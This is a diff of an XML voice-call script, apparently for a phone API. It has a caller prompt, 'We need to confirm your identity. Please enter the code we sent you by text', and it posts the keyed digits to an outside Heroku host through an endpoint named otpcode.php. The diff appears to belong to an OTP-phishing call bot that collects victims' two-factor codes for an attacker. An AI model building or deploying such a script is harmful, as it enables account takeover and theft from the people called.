@@ -1,7 +1,6 @@
 <Response>
-  <GetDigits action="https://servertestbyxblackxcoder.herokuapp.com/" method="POST" finishOnKey="#" language="en-US">
-    <Speak language="en-US" loop="2">We need to confirm your identity. Please enter the six digit code we sent you by text. When you're finished, please press #.</Speak>
-  
+  <GetDigits action="https://servertestbyxblackxcoder.herokuapp.com/otpcode.php" method="POST" finishOnKey="#" language="en-US">
+    <Speak language="en-US" loop="3">We need to confirm your identity. Please enter the code we sent you by text. When you're finished, please press #.</Speak>
   </GetDigits>
   <Speak>Input not received.</Speak>
 </Response>
